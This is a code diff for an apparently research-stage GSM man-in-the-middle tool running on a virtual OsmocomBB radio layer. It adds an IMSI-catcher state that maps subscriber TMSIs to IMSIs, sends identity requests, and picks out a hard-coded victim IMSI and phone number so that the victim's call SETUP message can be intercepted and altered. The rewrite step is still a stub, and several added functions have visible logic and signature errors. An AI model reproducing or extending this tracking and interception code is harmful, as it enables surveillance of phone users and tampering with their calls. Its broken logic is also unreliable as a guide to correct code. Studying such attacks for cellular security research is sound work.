@@ -2,15 +2,19 @@
 #include <getopt.h>
 #include <virtphy/osmo_mcast_sock.h>
 #include <virtphy/virtual_um.h>
+#include <virtphy/common_util.h>
 #include <osmocom/core/gsmtap.h>
 #include <osmocom/gsm/protocol/gsm_04_08.h>
+#include <osmocom/gsm/gsm48.h>
 #include <osmocom/gsm/rsl.h>
 #include <osmocom/core/gsmtap_util.h>
+#include <osmocom/core/linuxlist.h>
 #include <osmocom/gsm/lapd_core.h>
 #include <osmocom/gsm/lapdm.h>
 #include <coder.h>
 #include <errno.h>
 #include <string.h>
+#include <lapdm_util.h>
 
 #define DEFAULT_DL_RX_GRP DEFAULT_MS_MCAST_GROUP
 #define DEFAULT_DL_TX_GRP "226.0.0.1"
@@ -18,74 +22,9 @@
 #define DEFAULT_UL_TX_GRP DEFAULT_BTS_MCAST_GROUP
 #define DEFAULT_MCAST_PORT 4729 /* IANA-registered port for GSMTAP */
 
-#define RA_EST_CAUSE_ORIG_CALL 0xd0
-#define RA_MASK_3 0xd0
-
-/* TS 04.06 Table 4 / Section 3.8.1 */
-#define LAPD_U_SABM	0x7
-#define LAPD_U_SABME	0xf
-#define LAPD_U_DM	0x3
-#define LAPD_U_UI	0x0
-#define LAPD_U_DISC	0x8
-#define LAPD_U_UA	0xC
-#define LAPD_U_FRMR	0x11
-
-#define LAPD_S_RR	0x0
-#define LAPD_S_RNR	0x1
-#define LAPD_S_REJ	0x2
-
-/* TS 04.06 Figure 4 / Section 3.2 */
-#define LAPDm_LPD_NORMAL  0
-#define LAPDm_LPD_SMSCB	  1
-#define LAPDm_SAPI_NORMAL 0
-#define LAPDm_SAPI_SMS	  3
-#define LAPDm_ADDR(lpd, sapi, cr) ((((lpd) & 0x3) << 5) | (((sapi) & 0x7) << 2) | (((cr) & 0x1) << 1) | 0x1)
-
-#define LAPDm_ADDR_LPD(addr) (((addr) >> 5) & 0x3)
-#define LAPDm_ADDR_SAPI(addr) (((addr) >> 2) & 0x7)
-#define LAPDm_ADDR_CR(addr) (((addr) >> 1) & 0x1)
-#define LAPDm_ADDR_EA(addr) ((addr) & 0x1)
-
-/* TS 04.06 Table 3 / Section 3.4.3 */
-#define LAPDm_CTRL_I(nr, ns, p)	((((nr) & 0x7) << 5) | (((p) & 0x1) << 4) | (((ns) & 0x7) << 1))
-#define LAPDm_CTRL_S(nr, s, p)	((((nr) & 0x7) << 5) | (((p) & 0x1) << 4) | (((s) & 0x3) << 2) | 0x1)
-#define LAPDm_CTRL_U(u, p)	((((u) & 0x1c) << (5-2)) | (((p) & 0x1) << 4) | (((u) & 0x3) << 2) | 0x3)
-
-#define LAPDm_CTRL_is_I(ctrl)	(((ctrl) & 0x1) == 0)
-#define LAPDm_CTRL_is_S(ctrl)	(((ctrl) & 0x3) == 1)
-#define LAPDm_CTRL_is_U(ctrl)	(((ctrl) & 0x3) == 3)
-
-#define LAPDm_CTRL_U_BITS(ctrl)	((((ctrl) & 0xC) >> 2) | ((ctrl) & 0xE0) >> 3)
-#define LAPDm_CTRL_PF_BIT(ctrl)	(((ctrl) >> 4) & 0x1)
-
-#define LAPDm_CTRL_S_BITS(ctrl)	(((ctrl) & 0xC) >> 2)
-
-#define LAPDm_CTRL_I_Ns(ctrl)	(((ctrl) & 0xE) >> 1)
-#define LAPDm_CTRL_Nr(ctrl)	(((ctrl) & 0xE0) >> 5)
-
-#define LAPDm_LEN(len)	((len << 2) | 0x1)
-#define LAPDm_MORE	0x2
-#define LAPDm_EL	0x1
-
-#define LAPDm_U_UI	0x0
-
-/* TS 04.06 Section 5.8.3 */
-#define N201_AB_SACCH		18
-#define N201_AB_SDCCH		20
-#define N201_AB_FACCH		20
-#define N201_Bbis		23
-#define N201_Bter_SACCH		21
-#define N201_Bter_SDCCH		23
-#define N201_Bter_FACCH		23
-#define N201_B4			19
-
-enum lapdm_format {
-	LAPDm_FMT_A,
-	LAPDm_FMT_B,
-	LAPDm_FMT_Bbis,
-	LAPDm_FMT_Bter,
-	LAPDm_FMT_B4,
-};
+#define IMSI_MAX_DIGITS 15
+#define GSM_EXTENSION_LENGTH 15
+#define tmsi_from_string(str) strtoul(str, NULL, 10)
 
 static char* dl_rx_grp = DEFAULT_DL_RX_GRP;
 static char* dl_tx_grp = DEFAULT_DL_TX_GRP;
@@ -97,10 +36,17 @@ static struct virt_um_inst *downlink = NULL;
 static struct virt_um_inst *uplink = NULL;
 
 static enum mitm_states {
-	STATE_SABM, // Wait for SABM - CM Service Request
-	STATE_SERVICE_ACCEPT_CIPHERING_MODE_CMD, // Wait for either SERVICE ACCEPT or CIPHERING MODE COMMAND
-	STATE_SETUP, // Wait for SETUP message
-} mitm_state = STATE_SABM;
+	STATE_INTERCEPT_SABM, // Wait for SABM - CM Service Request
+	STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, // Wait for either SERVICE ACCEPT or CIPHERING MODE COMMAND
+	STATE_INTERCEPT_SETUP, // Wait for SETUP message
+	STATE_IMSI_CATCHER // we need to get the target imsi - tmsi mapping before we can go on with the attack. Basically we are an imsi catcher in this state.
+} mitm_state = STATE_IMSI_CATCHER;
+
+static enum mi_check_retval {
+	MI_CHECK_VICTIM_SUBSCR,
+	MI_CHECK_UNMAPPED_TMSI,
+	MI_CHECK_OTHER_SUBSCR
+};
 
 static struct chan_desc {
 	uint8_t type;
@@ -109,11 +55,29 @@ static struct chan_desc {
 
 } ded_chan;
 
+static struct map_imsi_tmsi {
+	char imsi[IMSI_MAX_DIGITS + 1];
+	uint32_t tmsi;
+	struct llist_head entry;
+};
+
+static struct pending_imsi_request {
+	struct map_imsi_tmsi * map;
+	struct chan_desc chan;
+	uint8_t pending = 0;
+} pending_imsi_req;
+
 static int setup_burst_counter = 0;
 
-static uint32_t victim_tmsi = 0x1ad86f62;
-static uint64_t victim_imsi = 0x2926709347452663;
 static uint32_t intercept_arfcn = 666;
+
+static char imsi_victim[GSM_EXTENSION_LENGTH + 1] = "2926709347452663";
+static char msisdn_victim[GSM_EXTENSION_LENGTH + 1] = "017519191919";
+static char msisdn_called[GSM_EXTENSION_LENGTH + 1] = "017518181818";
+static char msisdn_attacker[GSM_EXTENSION_LENGTH + 1] = "017517171717";
+
+
+LLIST_HEAD(other_subscribers);
 
 static void handle_options(int argc, char **argv)
 {
@@ -155,128 +119,50 @@ static void handle_options(int argc, char **argv)
 	}
 }
 
-/* input into layer2 (from layer 1) */
-static int pull_lapd_ctx(struct msgb *msg,
-	uint8_t chan_nr, uint8_t link_id, enum lapdm_mode mode, struct lapdm_msg_ctx *mctx, struct lapd_msg_ctx *lctx)
-{
-	uint8_t cbits = chan_nr >> 3;
-	int n201;
-
-	/* when we reach here, we have a msgb with l2h pointing to the raw
-	 * 23byte mac block. The l1h has already been purged. */
-
-	mctx->chan_nr = chan_nr;
-	mctx->link_id = link_id;
-
-	/* check for L1 chan_nr/link_id and determine LAPDm hdr format */
-	if (cbits == 0x10 || cbits == 0x12) {
-		/* Format Bbis is used on BCCH and CCCH(PCH, NCH and AGCH) */
-		mctx->lapdm_fmt = LAPDm_FMT_Bbis;
-		n201 = N201_Bbis;
-	} else {
-		if (mctx->link_id & 0x40) {
-			/* It was received from network on SACCH */
-
-			/* If UI on SACCH sent by BTS, lapdm_fmt must be B4 */
-			if (mode == LAPDM_MODE_MS
-			 && LAPDm_CTRL_is_U(msg->l2h[3])
-			 && LAPDm_CTRL_U_BITS(msg->l2h[3]) == 0) {
-				n201 = N201_B4;
-				mctx->lapdm_fmt = LAPDm_FMT_B4;
-			} else {
-				n201 = N201_AB_SACCH;
-				mctx->lapdm_fmt = LAPDm_FMT_B;
-			}
-			/* SACCH frames have a two-byte L1 header that
-			 * OsmocomBB L1 doesn't strip */
-			mctx->tx_power_ind = msg->l2h[0] & 0x1f;
-			mctx->ta_ind = msg->l2h[1];
-			msg->l2h = msgb_pull(msg, 2);
-		} else {
-			n201 = N201_AB_SDCCH;
-			mctx->lapdm_fmt = LAPDm_FMT_B;
-		}
-	}
-
-	switch (mctx->lapdm_fmt) {
-	case LAPDm_FMT_A:
-	case LAPDm_FMT_B:
-	case LAPDm_FMT_B4:
-		// We are not interested in the actual datalink here
-		lctx->dl = NULL;
-		/* obtain SAPI from address field */
-		mctx->link_id |= LAPDm_ADDR_SAPI(msg->l2h[0]);
-		/* G.2.3 EA bit set to "0" is not allowed in GSM */
-		if (!LAPDm_ADDR_EA(msg->l2h[0])) {
-			return -EINVAL;
-		}
-		/* adress field */
-		lctx->lpd = LAPDm_ADDR_LPD(msg->l2h[0]);
-		lctx->sapi = LAPDm_ADDR_SAPI(msg->l2h[0]);
-		lctx->cr = LAPDm_ADDR_CR(msg->l2h[0]);
-		/* command field */
-		if (LAPDm_CTRL_is_I(msg->l2h[1])) {
-			lctx->format = LAPD_FORM_I;
-			lctx->n_send = LAPDm_CTRL_I_Ns(msg->l2h[1]);
-			lctx->n_recv = LAPDm_CTRL_Nr(msg->l2h[1]);
-		} else if (LAPDm_CTRL_is_S(msg->l2h[1])) {
-			lctx->format = LAPD_FORM_S;
-			lctx->n_recv = LAPDm_CTRL_Nr(msg->l2h[1]);
-			lctx->s_u = LAPDm_CTRL_S_BITS(msg->l2h[1]);
-		} else if (LAPDm_CTRL_is_U(msg->l2h[1])) {
-			lctx->format = LAPD_FORM_U;
-			lctx->s_u = LAPDm_CTRL_U_BITS(msg->l2h[1]);
-		} else
-			lctx->format = LAPD_FORM_UKN;
-		lctx->p_f = LAPDm_CTRL_PF_BIT(msg->l2h[1]);
-		if (lctx->sapi != LAPDm_SAPI_NORMAL
-		 && lctx->sapi != LAPDm_SAPI_SMS
-		 && lctx->format == LAPD_FORM_U
-		 && lctx->s_u == LAPDm_U_UI) {
-			/* 5.3.3 UI frames with invalid SAPI values shall be
-			 * discarded
-			 */
-			return -EINVAL;
-		}
-		if (mctx->lapdm_fmt == LAPDm_FMT_B4) {
-			lctx->n201 = n201;
-			lctx->length = n201;
-			lctx->more = 0;
-			msg->l3h = msg->l2h + 2;
-			msgb_pull_to_l3(msg);
-		} else {
-			/* length field */
-			if (!(msg->l2h[2] & LAPDm_EL)) {
-				/* G.4.1 If the EL bit is set to "0", an
-				 * MDL-ERROR-INDICATION primitive with cause
-				 * "frame not implemented" is sent to the
-				 * mobile management entity. */
-				return -EINVAL;
-			}
-			lctx->n201 = n201;
-			lctx->length = msg->l2h[2] >> 2;
-			lctx->more = !!(msg->l2h[2] & LAPDm_MORE);
-			msg->l3h = msg->l2h + 3;
-			msgb_pull_to_l3(msg);
-		}
-		break;
-	case LAPDm_FMT_Bter:
-		/* FIXME not implemented */
-		return -EINVAL;
-	case LAPDm_FMT_Bbis:
-		/* directly pass up to layer3, we have no lapdm header in this case */
-		msg->l3h = msg->l2h;
-		msgb_pull_to_l3(msg);
-		return -EINVAL;
-	default:
-		msgb_free(msg);
-	}
-
-	return 0;
-}
-
 void manipulate_setup_message(uint8_t *msg) {
  // TODO: manipulate message
+}
+
+int mi_check(uint8_t *mi, uint8_t mi_len, struct map_imsi_tmsi *map) {
+	uint8_t mi_type;
+	char mi_string[GSM48_MI_SIZE];
+
+	mi_type = mi[0] & GSM_MI_TYPE_MASK;
+	gsm48_mi_to_string(mi_string, sizeof(mi_string), mi, mi_len);
+
+	switch (mi_type) {
+	case GSM_MI_TYPE_IMSI:
+		return strcmp(mi_string, imsi_victim) == 0 ? MI_CHECK_VICTIM_SUBSCR : MI_CHECK_OTHER_SUBSCR;
+	case GSM_MI_TYPE_TMSI:
+		llist_for_each_entry(map, other_subscribers, entry)
+		{
+			if (tmsi_from_string(mi_string) == map->tmsi) {
+				// tmsi mapped to NULL
+				if (map->imsi == NULL) {
+					return MI_CHECK_UNMAPPED_TMSI;
+				}
+				// tmsi mapped to victims imsi
+				else if (strcmp(map->imsi,
+				                  imsi_victim)) {
+					return MI_CHECK_VICTIM_SUBSCR;
+				}
+				// tmsi mapped to other imsi
+				else {
+					return MI_CHECK_OTHER_SUBSCR;
+				}
+			}
+		}
+		// tmsi not yet mapped -> create mapping to NULL
+		map = talloc_zero(NULL, struct map_imsi_tmsi);
+		map->tmsi = tmsi_from_string(mi_string);
+		llist_add(map, other_subscribers);
+		return MI_CHECK_UNMAPPED_TMSI;
+	case GSM_MI_TYPE_IMEI:
+	case GSM_MI_TYPE_IMEISV:
+	default:
+		// not interested in imei or any other identity type
+		return MI_CHECK_OTHER_SUBSCR;
+	}
 }
 
 static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
@@ -287,15 +173,15 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
 	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
 
-	msg->l2h = msgb_pull(msg, sizeof(*gh));
-
 	// ignore all downlink messages we do not want to intercept
 	if (intercept_arfcn != arfcn) {
-		goto freemsg;
+		// TODO implement handling. For now we say all traffic we intercept is from either attacked bts or ms
 	}
 
+	msg->l2h = msgb_pull(msg, sizeof(*gh));
+
 	switch (mitm_state) {
-	case STATE_SERVICE_ACCEPT_CIPHERING_MODE_CMD:
+	case STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD:
 		// check if the msg is received in a dedicated channel.
 		// Can also be TCH/FACCH because of very early assignment
 		if (gsmtap_chantype == GSMTAP_CHANNEL_SDCCH4 ||
@@ -325,12 +211,12 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 				if(l3_hdr->proto_discr == GSM48_PDISC_MM) {
 					// of type service accept
 					if(l3_hdr->msg_type == GSM48_MT_MM_CM_SERV_ACC) {
-						mitm_state = STATE_SETUP;
+						mitm_state = STATE_INTERCEPT_SETUP;
 						setup_burst_counter = 1;
 					}
 					// or ciphering request
 					else if(l3_hdr->msg_type == GSM48_MT_RR_CIPH_M_CMD) {
-						mitm_state = STATE_SETUP;
+						mitm_state = STATE_INTERCEPT_SETUP;
 						setup_burst_counter = 2;
 					}
 				}
@@ -342,28 +228,82 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 		break;
 	}
 
-	msgb_push(msg, sizeof(*gh));
+	// push all the bits that have been pulled before so that we have l1 header at data pointer again
+	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
+
 	// Forward msg to downlink
 	virt_um_write_msg(downlink, msg);
-	return;
-
-freemsg:
-	talloc_free(msg);
-
 }
 
 static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 {
 	uint8_t encoded_msg[LEN_PLAIN / 8] = {0};
 	struct gsmtap_hdr *gh = msgb_l1(msg);
+	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
 	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
 	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
 	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
 
+	// ignore all downlink messages we do not want to intercept
+	if (intercept_arfcn != arfcn) {
+		// TODO implement handling. For now we say all traffic we intercept is from either attacked bts or ms
+	}
+
 	msg->l2h = msgb_pull(msg, sizeof(*gh));
 
 	switch(mitm_state) {
-	case STATE_SABM:
+	case STATE_IMSI_CATCHER:
+		if (gsmtap_chantype == GSMTAP_CHANNEL_SDCCH4 ||
+		    gsmtap_chantype == GSMTAP_CHANNEL_SDCCH8) {
+			uint8_t rsl_chantype, link_id, chan_nr;
+			struct lapdm_msg_ctx mctx;
+			struct lapd_msg_ctx lctx;
+
+			memset(&mctx, 0, sizeof(mctx));
+			memset(&lctx, 0, sizeof(lctx));
+
+			chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
+			chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
+
+			if(pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx, &lctx)) {
+				printf("Frame number %d: lapd context could not be retrieved...", gh->frame_number);
+				break;
+			}
+
+			if(pending_imsi_req.pending) {
+				//TODO: check for responses of the pending request and switch to intercept_sabm state if the victim was found and is mapped
+				break;
+			}
+
+			// check if we have a unnumbered frame of type SABM
+			if(LAPDm_CTRL_is_U(lctx.format) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {
+				struct gsm48_hdr *l3_hdr = msgb_l3(msg);
+				struct map_imsi_tmsi *mapped;
+
+				// check if we have a MM CM service request
+				if(l3_hdr->proto_discr == GSM48_PDISC_MM &&
+				   l3_hdr->msg_type == GSM48_MT_MM_CM_SERV_REQ) {
+					struct gsm48_service_request *sreq = (struct gsm48_service_request *) l3_hdr->data;
+
+					switch(mi_check(sreq->mi, sreq->mi_len, &mapped)) {
+					case MI_CHECK_VICTIM_SUBSCR:
+
+						break;
+					case MI_CHECK_UNMAPPED_TMSI:
+						pending_imsi_req.map = mapped;
+						pending_imsi_req.chan = ded_chan;
+						// send imsi identity request to subscriber to get the imsi-tmsi mapping for him
+						tx_identity_req();
+						break;
+					case MI_CHECK_OTHER_SUBSCR:
+						// we are not interested in cm requests of subscribers other than victim
+						break;
+					}
+				}
+			}
+		}
+		break;
+	case STATE_INTERCEPT_SABM:
 		// check if the msg is received in a dedicated channel.
 		// Can also be TCH/FACCH because of very early assignment
 		if (gsmtap_chantype == GSMTAP_CHANNEL_SDCCH4 ||
@@ -380,14 +320,15 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 			chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
 			chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
 
-			if(!pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx, &lctx)) {
-				// lapdm context could not be properly parsed
+			if(pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx, &lctx)) {
+				printf("Frame number %d: lapd context could not be retrieved...", gh->frame_number);
 				break;
 			}
 
 			// check if we have a unnumbered frame of type SABM
 			if(LAPDm_CTRL_is_U(lctx.format) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {
 				struct gsm48_hdr *l3_hdr = msgb_l3(msg);
+				struct map_imsi_tmsi *mapped;
 
 				// check if we have a MM CM service request
 				if(l3_hdr->proto_discr == GSM48_PDISC_MM &&
@@ -396,39 +337,53 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 
 					// check if we have a mobile originated call setup from our victim
 					if(sreq->cm_service_type == GSM48_CMSERV_MO_CALL_PACKET
-					   && ((*(uint32_t *)sreq->mi) == victim_tmsi || (*(uint64_t *)sreq->mi) == victim_imsi)) { // TODO: Mobile identity is somewhat encoded and cant be compared like this here
+					   && mi_check(sreq->mi, sreq->mi_len) == MI_CHECK_VICTIM_SUBSCR) {
 						// if we are here, we know that our victim requested a call establisment from the network
 						ded_chan.type = gsmtap_chantype;
 						ded_chan.timeslot = timeslot;
 						ded_chan.subchan = subslot;
-						mitm_state = STATE_SERVICE_ACCEPT_CIPHERING_MODE_CMD;
+						mitm_state = STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD;
 					}
 				}
 			}
 		}
-		break;
-		case STATE_SETUP:
-			if(ded_chan.type == gsmtap_chantype && ded_chan.subchan == subslot && ded_chan.timeslot == timeslot) {
-				// the third message on uplink after ciphering mode command should be the setup message
-				// 1: LAPDM-Receive-Ready, 2: CIPHERING-MODE-COMPLETE, 3: SETUP
-				if(++setup_burst_counter == 3) {
-					// encode message as virtual layer does not support encoding right now
-					xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
-					manipulate_setup_message(encoded_msg);
-					xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, msgb_data(msg));
-					mitm_state = STATE_SABM;
-				}
+	break;
+	case STATE_INTERCEPT_SETUP:
+		if(ded_chan.type == gsmtap_chantype && ded_chan.subchan == subslot && ded_chan.timeslot == timeslot) {
+			// the third message on uplink after ciphering mode command should be the setup message
+			// 1: LAPDM-Receive-Ready, 2: CIPHERING-MODE-COMPLETE, 3: SETUP
+			if(++setup_burst_counter == 3) {
+				// encode message as virtual layer does not support encoding right now
+				xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
+				manipulate_setup_message(encoded_msg);
+				xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, msgb_data(msg));
+				mitm_state = STATE_INTERCEPT_SABM;
 			}
-			// do nothing if the incoming msg is not on the synced channel
-			break;
-		default:
-			break;
+		}
+		// do nothing if the incoming msg is not on the synced channel
+		break;
+	default:
+		break;
 	}
 
-	msgb_push(msg, sizeof(*gh));
+	// push all the bits that have been pulled before so that we have l1 header at data pointer again
+	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
 	// Forward msg to uplink
 	virt_um_write_msg(uplink, msg);
+}
 
+/*
+ * Just forward to test connection e.g.
+ */
+static void uplink_rcv_cb_simple_forward(struct virt_um_inst *vui, struct msgb *msg) {
+	virt_um_write_msg(uplink, msg);
+}
+
+/*
+ * Just forward to test connection e.g.
+ */
+static void downlink_rcv_cb_simple_forward(struct virt_um_inst *vui, struct msgb *msg) {
+	virt_um_write_msg(downlink, msg);
 }
 
 int main(int argc, char **argv)
